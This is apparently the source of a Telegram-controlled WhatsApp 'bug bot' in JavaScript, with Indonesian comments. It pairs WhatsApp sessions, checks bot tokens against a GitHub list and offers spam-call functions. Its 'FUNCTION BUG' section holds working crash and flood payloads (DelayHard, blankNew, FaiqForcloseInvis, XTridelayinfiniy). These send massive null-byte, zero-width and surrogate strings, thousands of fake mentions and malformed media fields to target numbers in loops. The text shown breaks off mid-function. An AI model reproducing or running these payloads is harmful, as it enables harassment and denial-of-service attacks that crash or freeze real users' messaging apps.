const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require('@bellachu/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
const FormData = require('form-data');
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const cd = "cooldown.json";
const https = require("https")
const sharp = require("sharp");
const { v4, uuidv4 } = require("uuid")
const { pipeline } = require("stream")
const { promisify } = require("util")
const streamPipeline = promisify(pipeline)
const { OpenAI } = require("openai");
const { GoogleGenAI } = require("@google/genai");
const vm = require('vm');
const axios = require("axios");
const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const keyboardIntervals = {};
const userMode = {};
const userMedia = {};
const userFormat = {};
const userBase = {};

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`bot ${botNum}:`, error);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/ikky161/ikoyy/refs/heads/main/token.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(` JANGAN LUPA MASUK CH INFO SCRIPT⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

`));


console.log(chalk.greenBright(`
┌─────────────────────────────┐
│ ⚠️ inicialização em execução com sucesso  
├─────────────────────────────┤
│ DESENVOLVEDOR : IKKY      
│ TELEGRAMA : @yteamlowhh
│ CHANEL : @infoexzy
└─────────────────────────────┘
`));

console.log(chalk.blueBright(`
[ ----- ⚔️ ----- ]
`
));
};

validateToken();
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sock.newsletterFollow("120363301087120650@newsletter");
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`◇ 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 ${botNumber}..... 𝙨𝙪𝙘𝙘𝙚𝙨\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      sock.newsletterFollow("120363301087120650@newsletter");
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`js◇ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙧𝙤𝙨𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜
𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari,${hours} Jam,${minutes} Menit`
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

// Memory Panel
function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function getRandomImage() {
  const images = [
    "https://files.catbox.moe/6kyeoi.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

const bagUrl = "https://files.catbox.moe/gmdqin.jpg";
const ownerUrl = "https://files.catbox.moe/dbra2d.jpg";
const bugUrl = "https://files.catbox.moe/lwyyvh.jpg";

const menuEffects = [
  "5104841245755180586",
  "5107584321108051014",
  "5159385139981059251",
  "5046509860389126442"
];

// ~ Coldowwn

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
  if (!link.includes("https://whatsapp.com/channel/"))
    return { error: "Link tidak valid!" };

  let channelId = link.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await sock.newsletterMetadata("invite", channelId);
    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
    };
  } catch (err) {
    return { error: "Gagal mengambil data! Pastikan channel valid." };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
async function spamcall(target) {
  // Inisialisasi koneksi dengan makeWASocket
  const sock = makeWASocket({
    printQRInTerminal: false, // QR code tidak perlu ditampilkan
  });

  try {
    console.log(`📞 Mengirim panggilan ke ${target}`);

    // Kirim permintaan panggilan
    await sock.query({
      tag: "call",
      json: ["action", "call", "call", { id: `${target}` }],
    });

    console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
  } catch (err) {
    console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
  } finally {
    sock.ev.removeAllListeners(); // Hapus semua event listener
    sock.ws.close(); // Tutup koneksi WebSocket
  }
}

async function sendOfferCall(target) {
  try {
    await sock.offerCall(target);
    console.log(chalk.white.bold(`Success Send Offer Call To Target`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
  }
}

async function sendOfferVideoCall(target) {
  try {
    await sock.offerCall(target, {
      video: true,
    });
    console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
  } catch (error) {
    console.error(
      chalk.white.bold(`Failed Send Offer Video Call To Target:`, error)
    );
  }
}
//--------------------------------------------FUNCTION BUG----------------------------------------------------------\\
async function DelayHard(sock, target) {
  const msg = {
    interactiveResponseMessage: {
      header: {
        title: "\u0000" + "{{".repeat(1000)
      },
      body: {
        text: "Garam madu"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        params: {
          json: "\u0000".repeat(2000)
        }
      },
      version: 3,
      entryPointConversionSource: "call permission_request"
    }
  };

  const mbgdly = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')
            ],
            body: {
              text: 'Garam madu',
              format: 'DEFAULT'
            },
            footer: {
              text: '\u0000'.repeat(25000),
              format: 'DEFAULT'
            },
            nativeFlowResponseMessage: {
              name: 'galaxy_message',
              paramsJson: `{"flow_cta":{"title":${"\u0000".repeat(990000)}}}`,
              version: 3
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 1500; i++) {
    await sock.relayMessage(target, msg, {}).catch(() => {});
    await sock.relayMessage(target, mbgdly, { participant: { jid: target } }).catch(() => {});
  }
}

async function blankNew(sock, target) {
  try {
    sock.sendMessage = sock.sendMessage || sock.sendMessage;
    
    for (let i = 0; i < 300; i++) {
      try {
        await sock.sendMessage(target, {
          text: "𑇂𑆵𑆴𑆿".repeat(600000) + "\u0000".repeat(600000)
        });
      } catch(e) {}
    }
    
    await sock.sendMessage(target, {
      text: " ",
      mentions: Array.from({ length: 10000 }, () => `${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`)
    });
    
    for (let i = 0; i < 500; i++) {
      await sock.sendMessage(target, { text: "\u200B".repeat(900000) });
    }
    
    await sock.sendMessage(target, {
      text: "\uD800".repeat(400000) + "\uDFFF".repeat(400000)
    });

    const crashPayload = "\u0003".repeat(9000000) + "\u0000".repeat(5000000) + "\uFFFF".repeat(3000000);
    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "ꦾ" + "\u200B".repeat(25000) + " ꦽ  " + "\u200C".repeat(25000) + "ꦾ" + "\uD800".repeat(10000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: crashPayload,
              version: 3
            }
          },
          contextInfo: {
            participant: { jid: target },
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 2000 }, () => `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`)
            ]
          }
        }
      }
    }, {});
    
    await relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    const crashNewsletter = {
      newsletterAdminInviteMessage: {
        newsletterJid: "9741@newsletter",
        newsletterName: "\u0000".repeat(60000) + "\uFFFF".repeat(60000) + "\u200B".repeat(60000) + "\uD800".repeat(30000),
        caption: "\uD800".repeat(40000) + "\u200C".repeat(40000) + "\u200B".repeat(40000),
        inviteExpiration: "9999999999999999",
      }
    };
    
    await relayMessage(target, crashNewsletter, {
      messageId: null,
      participant: { jid: target }
    });

    for (let i = 0; i < 1000; i++) {
      const spamPayload = 
        "\u200B".repeat(40000) +   
        "\u200C".repeat(40000) +   
        "\u200D".repeat(40000) +   
        "\uFEFF".repeat(40000) +   
        "\u0000".repeat(40000) +   
        "\u200E".repeat(40000) +   
        "\u200F".repeat(40000) +   
        "\u2060".repeat(40000) +   
        "𓂀".repeat(20000) +
        "\uD800".repeat(15000) +
        "\uFFFC".repeat(15000);
      
      try {
        await sock.sendMessage(target, { text: spamPayload }, { 
          ephemeralExpiration: 0,
          quoted: i % 5 === 0 ? msg : null
        });
      } catch(e) {}
      
      if (i % 30 === 0) {
        try {
          await sock.sendMessage(target, { text: "\u200B".repeat(300000) + "\uD800".repeat(100000) }, { quoted: null });
        } catch(e) {}
      }
      
      if (i % 100 === 0) console.log(`[ ! ] Blank ${i} sukses dikirim ke ${target}`);
      
      await new Promise(resolve => setTimeout(resolve, 5));
    }

    for (let j = 0; j < 5; j++) {
      await sock.sendMessage(target, {
        text: "\u200B".repeat(250000) + "\uFFFC".repeat(250000) + "\uD800".repeat(150000) + "\u0000".repeat(150000)
      }, { ephemeralExpiration: 0 });
    }

    const massiveBlankMention = {
      text: "\u200B".repeat(80000) + "\uD800".repeat(50000),
      mentions: Array.from({ length: 3000 }, () => `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`)
    };
    
    await sock.sendMessage(target, massiveBlankMention);
    
    const lastCrash = {
      text: "\u0000".repeat(200000) + "\uFFFF".repeat(200000) + "𓂀".repeat(50000)
    };
    
    for (let k = 0; k < 3; k++) {
      await sock.sendMessage(target, lastCrash);
    }
    
    console.log("[ ! ] Bug sent to target");
    
  } catch (error) {
    console.log("[ ! ] Error lanjut attack" + error);
    for (let r = 0; r < 800; r++) {
      try {
        await sock.sendMessage(target, { text: "\uD800".repeat(80000) + "\u200B".repeat(80000) });
      } catch(e) {}
    }
  }
}

async function FaiqForcloseInvis(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: true
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            },
            title: "Faiq Is HereC‌⃰ꪸ⃟",
            hasMediaAttachment: true
          },
          body: {
            text: "\0"
          },
          nativeFlowMessage: {
            buttons: "\0".repeat(500000)
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  })
}

async function XTridelayinfiniy(sock, target) {
  const nangleys = [
    {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1995 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593,
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
          },
        },
      },
    },
    {
      viewOnceMessage: {
        message: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            caption: "XTridelay|acumalaka",
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "19769",
            height: 354,
            width: 783,
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            jpegThumbnail: null,
            scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
            scanLengths: [24378, 17332],
            contextInfo: {
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 500000 }, () => ({ "\0": "\0" }))
              },
              remoteJid: "status@broadcast",
              groupMentions: [],
              entryPointConversionSource: "booking_status"
            },
          },
        },
      },
    },
  ];

  const nangleys2 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "XTridelay|acumalaka"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: ["inapp_signup", "booking_status", "galaxy_message"][Math.floor(Math.random() * 3)],
                buttonParamsJson: "{}"
              },
              {
                name: "\0".repeat(1000000),
                buttonParamsJson: "{}"
              }
            ]
          }
        }
      }
    }
  };

  const relayOptions = {
    statusJidList: [target],
